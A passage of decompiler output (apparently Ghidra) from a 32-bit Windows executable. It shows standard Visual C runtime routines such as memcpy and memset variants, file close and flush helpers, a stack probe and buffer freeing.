      *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
      *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
      return param_1;
    default:
      uVar3 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar2 = uVar3 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar1 = (undefined4 *)((int)param_1 + 3);
        if (uVar2 < 8) {
LAB_004046ac:
                    // WARNING: Could not recover jumptable at 0x004046ac. Too many branches
                    // WARNING: Treating indirect jump as call
          puVar1 = (undefined4 *)(*(code *)(&PTR_LAB_0040472c)[uVar2])();
          return puVar1;
        }
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_004046a4_caseD_1;
        case 2:
          goto switchD_004046a4_caseD_2;
        case 3:
          goto switchD_004046a4_caseD_3;
        }
        break;
      case 2:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar3 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar1 = (undefined4 *)((int)param_1 + 2);
        if (uVar2 < 8) goto LAB_004046ac;
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_004046a4_caseD_1;
        case 2:
          goto switchD_004046a4_caseD_2;
        case 3:
          goto switchD_004046a4_caseD_3;
        }
        break;
      case 3:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar3 >> 2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        puVar1 = (undefined4 *)((int)param_1 + 1);
        if (uVar2 < 8) goto LAB_004046ac;
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_004046a4_caseD_1;
        case 2:
          goto switchD_004046a4_caseD_2;
        case 3:
          goto switchD_004046a4_caseD_3;
        }
      }
    }
  }
  return param_1;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  uint uVar2;
  size_t sVar3;
  uint *puVar4;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  puVar4 = (uint *)_Dst;
  if (3 < _Size) {
    uVar2 = -(int)_Dst & 3;
    sVar3 = _Size;
    if (uVar2 != 0) {
      sVar3 = _Size - uVar2;
      do {
        *(undefined *)puVar4 = (undefined)_Val;
        puVar4 = (uint *)((int)puVar4 + 1);
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar3 & 3;
    uVar2 = sVar3 >> 2;
    if (uVar2 != 0) {
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = uVar1;
        puVar4 = puVar4 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar4 = (char)uVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



undefined4 __cdecl FUN_004049e8(FILE *param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  uVar2 = 0xffffffff;
  if ((param_1->_flag & 0x40U) == 0) {
    if ((param_1->_flag & 0x83U) != 0) {
      uVar2 = FUN_004041bc((int *)param_1);
      __freebuf(param_1);
      iVar1 = FUN_00404acf(param_1->_file);
      if (iVar1 < 0) {
        uVar2 = 0xffffffff;
      }
      else if (param_1->_tmpfname != (char *)0x0) {
        FUN_004030d7(param_1->_tmpfname);
        param_1->_tmpfname = (char *)0x0;
      }
    }
  }
  else {
    uVar2 = 0xffffffff;
  }
  param_1->_flag = 0;
  return uVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00404a3e(uint param_1)

{
  HANDLE hFile;
  BOOL BVar1;
  DWORD DVar2;
  
  DVar2 = _DAT_00406a50;
  if ((param_1 < DAT_00407f60) &&
     ((*(byte *)((&DAT_00407e60)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    hFile = (HANDLE)FUN_0040406f(param_1);
    BVar1 = FlushFileBuffers(hFile);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
    }
    else {
      DVar2 = 0;
    }
    if (DVar2 == 0) {
      return 0;
    }
  }
  _DAT_00406a50 = DVar2;
  _DAT_00406a4c = 9;
  return 0xffffffff;
}



// WARNING: Unable to track spacebase fully for stack

void FUN_00404aa0(undefined1 param_1)

{
  uint in_EAX;
  undefined1 *puVar1;
  undefined4 unaff_retaddr;
  
  puVar1 = &param_1;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00404acf(uint param_1)

{
  int iVar1;
  int iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  if (DAT_00407f60 <= param_1) {
    _DAT_00406a4c = 9;
    _DAT_00406a50 = 0;
    return 0xffffffff;
  }
  iVar5 = (param_1 & 0x1f) * 8;
  if ((*(byte *)((&DAT_00407e60)[(int)param_1 >> 5] + 4 + iVar5) & 1) == 0) {
    _DAT_00406a4c = 9;
    _DAT_00406a50 = 0;
    return 0xffffffff;
  }
  iVar1 = FUN_0040406f(param_1);
  if (iVar1 != -1) {
    if ((param_1 == 1) || (param_1 == 2)) {
      iVar1 = FUN_0040406f(2);
      iVar2 = FUN_0040406f(1);
      if (iVar2 == iVar1) goto LAB_00404b48;
    }
    hObject = (HANDLE)FUN_0040406f(param_1);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_00404b4a;
    }
  }
LAB_00404b48:
  DVar4 = 0;
LAB_00404b4a:
  FUN_00403ff5(param_1);
  *(undefined *)((&DAT_00407e60)[(int)param_1 >> 5] + 4 + iVar5) = 0;
  if (DVar4 == 0) {
    return 0;
  }
  FUN_00403f8e(DVar4);
  return 0xffffffff;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2003 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    FUN_004030d7(_File->_base);
    *(ushort *)&_File->_flag = *(ushort *)&_File->_flag & 0xfbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x00404bae. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}


